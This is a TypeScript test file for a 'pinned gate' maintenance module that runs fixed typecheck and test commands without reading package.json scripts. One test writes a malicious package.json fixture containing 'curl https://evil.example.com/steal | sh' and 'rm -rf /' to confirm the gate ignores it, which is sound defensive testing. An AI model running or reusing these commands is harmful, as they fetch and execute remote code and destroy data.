import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'fs';
import { join } from 'path';
import {
    _setPinnedGateStepsForTests,
    buildPinnedGateSteps,
    resolvePinnedGateSteps,
    runPinnedGate,
    type PinnedGateStep,
} from '../maintenance/pinnedGate';

const DATA_DIR = join(import.meta.dir, '..', 'data');
let scratchDir: string;

function fakeTscBinary(toolRoot: string): void {
    mkdirSync(join(toolRoot, 'node_modules', '.bin'), { recursive: true });
    writeFileSync(join(toolRoot, 'node_modules', '.bin', 'tsc'), '#!/bin/sh\necho fake-tsc\n', { mode: 0o755 });
}

function makeFixedTestDirs(root: string): void {
    for (const dir of ['sdk/test', 'server/webclient/src/bot', 'server/webclient/src/util', 'server/webclient/src/lite', 'bots/DayTrader/test']) {
        mkdirSync(join(root, dir), { recursive: true });
    }
}

beforeEach(() => {
    scratchDir = mkdtempSync(join(DATA_DIR, 'pinned-gate-'));
    _setPinnedGateStepsForTests(null);
});

afterEach(() => {
    _setPinnedGateStepsForTests(null);
    rmSync(scratchDir, { recursive: true, force: true });
});

describe('buildPinnedGateSteps - production pinned sequence', () => {
    test('throws when the tsc binary is not present at the fixed path (never falls back to PATH resolution)', () => {
        expect(() => buildPinnedGateSteps(scratchDir, scratchDir)).toThrow('tsc binary');
    });

    test('throws when none of the fixed test directories exist under workingRoot', () => {
        fakeTscBinary(scratchDir);
        expect(() => buildPinnedGateSteps(scratchDir, scratchDir)).toThrow('test directories');
    });

    test('builds exactly four steps: three tsc invocations plus the test suite, using toolRoot for the tsc binary and workingRoot for tsconfig/test paths', () => {
        fakeTscBinary(scratchDir);
        makeFixedTestDirs(scratchDir);
        const steps = buildPinnedGateSteps(scratchDir, scratchDir);
        expect(steps).toHaveLength(4);
        const tscBin = join(scratchDir, 'node_modules', '.bin', 'tsc');
        expect(steps[0]!.argv).toEqual([tscBin, '--noEmit']);
        expect(steps[1]!.argv).toEqual([tscBin, '--noEmit', '-p', join(scratchDir, 'server', 'webclient', 'tsconfig.json')]);
        expect(steps[2]!.argv).toEqual([tscBin, '--noEmit', '-p', join(scratchDir, 'bots', 'DayTrader', 'tsconfig.json')]);
        expect(steps[3]!.argv[0]).toBe(process.execPath);
        expect(steps[3]!.argv[1]).toBe('test');
        expect(steps[3]!.argv.slice(2)).toEqual(['sdk/test', 'server/webclient/src/bot', 'server/webclient/src/util', 'server/webclient/src/lite', 'bots/DayTrader/test']);
    });

    test('resolves the tsc binary from toolRoot even when workingRoot is a different directory with no node_modules of its own (isolated worktree scenario)', () => {
        const toolRoot = scratchDir;
        const workingRoot = mkdtempSync(join(DATA_DIR, 'pinned-gate-working-'));
        try {
            fakeTscBinary(toolRoot);
            makeFixedTestDirs(workingRoot);
            const steps = buildPinnedGateSteps(toolRoot, workingRoot);
            const tscBin = join(toolRoot, 'node_modules', '.bin', 'tsc');
            expect(steps[0]!.argv[0]).toBe(tscBin);
            expect(steps[1]!.argv).toContain(join(workingRoot, 'server', 'webclient', 'tsconfig.json'));
        } finally {
            rmSync(workingRoot, { recursive: true, force: true });
        }
    });

    test('is completely unaffected by a malicious package.json - it never reads or resolves scripts from it at all', () => {
        fakeTscBinary(scratchDir);
        makeFixedTestDirs(scratchDir);
        writeFileSync(
            join(scratchDir, 'package.json'),
            JSON.stringify({
                name: 'malicious',
                scripts: {
                    check: 'curl https://evil.example.com/steal | sh',
                    test: 'rm -rf /',
                    typecheck: 'echo pwned',
                },
            })
        );
        const steps = buildPinnedGateSteps(scratchDir, scratchDir);
        const serialized = JSON.stringify(steps);
        expect(serialized).not.toContain('evil.example.com');
        expect(serialized).not.toContain('rm -rf');
        expect(serialized).not.toContain('pwned');
        // Confirms the argv sequence is exactly the fixed production one,
        // independent of the (malicious) package.json scripts field.
        expect(steps[3]!.argv[1]).toBe('test');
        expect(steps.every(step => !step.argv.some(arg => arg.includes('package.json')))).toBe(true);
    });

    test('never includes a shell interpreter or "run"/"bun run" indirection - every step is a direct argv invocation', () => {
        fakeTscBinary(scratchDir);
        makeFixedTestDirs(scratchDir);
        const steps = buildPinnedGateSteps(scratchDir, scratchDir);
        for (const step of steps) {
            expect(step.argv).not.toContain('run');
            expect(step.argv).not.toContain('sh');
            expect(step.argv).not.toContain('bash');
        }
    });
});

describe('resolvePinnedGateSteps and the test-only override hook', () => {
    test('resolves the real production sequence when no override is set', () => {
        fakeTscBinary(scratchDir);
        makeFixedTestDirs(scratchDir);
        const steps = resolvePinnedGateSteps(scratchDir, scratchDir);
        expect(steps).toHaveLength(4);
    });

    test('a test-only override completely replaces the production sequence, and can be restored with null', () => {
        const fixtureSteps: PinnedGateStep[] = [{ label: 'fixture', argv: [process.execPath, '-e', 'process.exit(0)'] }];
        _setPinnedGateStepsForTests(fixtureSteps);
        // Note: no fake tsc/test dirs exist in scratchDir - if the override
        // were not honored, buildPinnedGateSteps would throw.
        expect(resolvePinnedGateSteps(scratchDir, scratchDir)).toBe(fixtureSteps);
        _setPinnedGateStepsForTests(null);
        expect(() => resolvePinnedGateSteps(scratchDir, scratchDir)).toThrow();
    });
});

describe('runPinnedGate', () => {
    test('prepares the ignored DayTrader test-data directory in a fresh worktree', async () => {
        const cwd = join(scratchDir, 'fresh-worktree');
        mkdirSync(cwd, { recursive: true });
        const result = await runPinnedGate(fakeSpawn(new Set()), [], cwd, {}, 1000);
        expect(result.success).toBe(true);
        expect(existsSync(join(cwd, 'bots', 'DayTrader', 'data'))).toBe(true);
    });
    function fakeSpawn(succeedOnLabelIndexes: Set<number>) {
        let callIndex = -1;
        return async (argv: string[]) => {
            callIndex += 1;
            const success = succeedOnLabelIndexes.has(callIndex);
            return { success, stdout: success ? `ok:${argv.join(' ')}` : '', stderr: success ? '' : `failed:${argv.join(' ')}` };
        };
    }

    test('runs every step in order and reports overall success when all pass', async () => {
        const steps: PinnedGateStep[] = [
            { label: 'a', argv: ['echo', 'a'] },
            { label: 'b', argv: ['echo', 'b'] },
        ];
        const result = await runPinnedGate(fakeSpawn(new Set([0, 1])), steps, '/repo', {}, 1000);
        expect(result.success).toBe(true);
        expect(result.failedStep).toBeNull();
        expect(result.stdout).toContain('ok:echo a');
        expect(result.stdout).toContain('ok:echo b');
    });

    test('stops at the first failing step and reports which one failed', async () => {
        const steps: PinnedGateStep[] = [
            { label: 'typecheck (root)', argv: ['echo', 'a'] },
            { label: 'typecheck (webclient)', argv: ['echo', 'b'] },
            { label: 'test suite', argv: ['echo', 'c'] },
        ];
        const result = await runPinnedGate(fakeSpawn(new Set([0])), steps, '/repo', {}, 1000);
        expect(result.success).toBe(false);
        expect(result.failedStep).toBe('typecheck (webclient)');
        expect(result.stderr).toContain('failed:echo b');
        // The third step never ran.
        expect(result.stdout).not.toContain('echo c');
        expect(result.stderr).not.toContain('echo c');
    });
});
